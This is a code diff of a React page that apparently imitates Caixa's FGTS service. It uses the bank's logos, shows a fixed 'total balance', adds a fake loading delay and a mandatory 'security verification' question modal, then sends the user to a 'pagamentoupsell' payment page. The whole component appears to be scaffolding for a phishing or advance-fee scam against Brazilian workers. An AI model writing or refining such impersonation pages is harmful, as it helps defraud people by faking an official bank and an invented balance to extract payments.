@@ -1,14 +1,13 @@
 import { useState, useEffect } from "react";
-import flogo from "../assets/f-logo.png"
+import flogo from "../assets/f-logo.png";
 import { BiDollar } from "react-icons/bi";
 import fgts from "../assets/fgts2.png";
 import caixa from "../assets/caixalogo.png";
-
 import { FaAngleRight, FaExchangeAlt, FaInfo } from "react-icons/fa";
 import Modal from "react-modal";
 import { TbLockExclamation } from "react-icons/tb";
-import logocaixa from "../assets/unnamed.png"
-import { RiExchangeDollarFill } from "react-icons/ri";
+import logocaixa from "../assets/unnamed.png";
+import { RiExchangeDollarFill, RiLoader4Line } from "react-icons/ri"; // Ícone de carregamento
 import SecurityCheck from "../security/securityCheck";
 
 // Estilo do Modal
@@ -33,16 +32,13 @@ const modalStyles: Modal.Styles = {
     },
 };
 
-Modal.setAppElement("#root"); // Acessibilidade para o Modal
+Modal.setAppElement("#root");
 
 export function Perguntas() {
-    const [, setLoadingData] = useState(true);
-    const [isModalOpen,] = useState(true);
+    const [isLoading, setIsLoading] = useState(true); // Controle do carregamento
+    const [isModalOpen, setIsModalOpen] = useState(false); // Controle do modal
     const [currentQuestion, setCurrentQuestion] = useState(0);
     const [responses, setResponses] = useState({});
-
-
-
     const [userData, setUserData] = useState({
         nome: "Usuário",
         cpf: "",
@@ -57,8 +53,9 @@ export function Perguntas() {
             if (storedUserData) {
                 setUserData(JSON.parse(storedUserData));
             }
-            setLoadingData(false);
-        }, 4000);
+            setIsLoading(false); // Finaliza o carregamento
+            setIsModalOpen(true); // Abre o modal
+        }, 4000); // 4 segundos de carregamento
     }, []);
 
     const questions = [
@@ -78,8 +75,6 @@ export function Perguntas() {
         "Você está atualmente em algum processo de revisão de crédito ou reanálise de limite junto a uma instituição financeira?"
     ];
 
-
-    // Função para salvar a resposta e avançar para a próxima pergunta
     const handleResponse = (answer: unknown) => {
         const updatedResponses = { ...responses, [questions[currentQuestion]]: answer };
         setResponses(updatedResponses);
@@ -88,17 +83,29 @@ export function Perguntas() {
         if (currentQuestion < questions.length - 1) {
             setCurrentQuestion(currentQuestion + 1);
         } else {
+            // Apenas ao final do questionário redireciona para a próxima página
             window.location.href = "/pagamentoupsell";
         }
     };
 
     return (
         <div className="w-screen h-screen flex flex-col items-center text-white mb-20">
+            {/* Overlay de carregamento */}
+            {isLoading && (
+                <div className="fixed inset-0 bg-black bg-opacity-75 flex flex-col items-center justify-center z-50">
+                    <RiLoader4Line className="animate-spin text-white text-6xl mb-4" />
+                    <p className="text-white text-xl">Carregando informações...</p>
+                    <p className="text-gray-400 text-lg animate-pulse">Aguarde...</p>
+                </div>
+            )}
+
             <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                 <div className="flex items-center justify-between w-full">
                     <div className="flex items-center space-x-3">
                         <img width={34} src={caixa} alt="logo" />
-                        <span className="text-white font-extralight">Olá, {userData.nome.split(" ")[0]}</span>
+                        <span className="text-white font-extralight">
+                            Olá, {userData.nome.split(" ")[0]}
+                        </span>
                     </div>
                     <img src={fgts} alt="fgts" width={65} />
                 </div>
@@ -111,9 +118,7 @@ export function Perguntas() {
                         <h2 className="font-bold text-xl">SALDO TOTAL</h2>
                     </div>
 
-                    <div className="font-semibold text-3xl px-2">
-                        R$1.739,70
-                    </div>
+                    <div className="font-semibold text-3xl px-2">R$1.739,70</div>
 
                     <span className="border-b border-b-white" />
                 </div>
@@ -125,9 +130,7 @@ export function Perguntas() {
                         <div className="bg-orange-400 p-2 rounded-full w-fit">
                             <img src={flogo} alt="flogo" width={20} />
                         </div>
-                        <h2 className="font-bold text-2xl text-zinc-700">
-                            Resumo do seu FGTS
-                        </h2>
+                        <h2 className="font-bold text-2xl text-zinc-700">Resumo do seu FGTS</h2>
                     </div>
 
                     <a className="" href="/saquedigital">
@@ -197,24 +200,28 @@ export function Perguntas() {
             {/* Modal para as Perguntas de Verificação de Segurança */}
             <Modal
                 isOpen={isModalOpen}
-                // onRequestClose={() => setIsModalOpen(false)}
                 style={modalStyles}
                 contentLabel="Verificação de Segurança"
             >
-
                 <div className="w-full flex justify-center mb-6">
                     <img src={logocaixa} alt="logg" width={100} />
-
                 </div>
                 <div className="text-center w-full">
-                    <div className="flex items-center w-full justify-center">
-                        <TbLockExclamation className="text-orange-500 text-3xl" />
-                        <h2 className="text-xl font-bold">Verificação de Segurança</h2>
+                    <div className="w-full flex justify-center mb-2">
+                        <TbLockExclamation className="text-orange-500 text-6xl mr-2" />
                     </div>
-                    <p className="text-xl text-zinc-500 mb-2">
-                        Etapa {currentQuestion + 1} de {questions.length}
+                    <div className="flex items-center w-full justify-center mb-2">
+
+                        <h2 className="text-xl font-bold text-zinc-900">
+                            VERIFICAÇÃO DE SEGURANÇA
+                        </h2>
+                    </div>
+                    <div className="text-2xl">
+                        ({currentQuestion + 1}/{questions.length})
+                    </div>
+                    <p className="text-2xl my-4 text-zinc-700 mb-10">
+                        {questions[currentQuestion]}
                     </p>
-                    <p className="text-2xl my-4 text-zinc-700 mb-10 ">{questions[currentQuestion]}</p>
 
                     <div className="flex flex-col w-full justify-center mt-4 space-y-3">
                         <button
@@ -225,17 +232,13 @@ export function Perguntas() {
                         </button>
                         <button
                             onClick={() => handleResponse("Não")}
-                            className="px-4 py-2 border border-primary bg-transparent  text-primary rounded-md  w-full"
+                            className="px-4 py-2 border border-primary bg-transparent text-primary rounded-md w-full"
                         >
                             Não
                         </button>
                     </div>
-
                 </div>
             </Modal>
         </div>
-
-
-
     );
 }
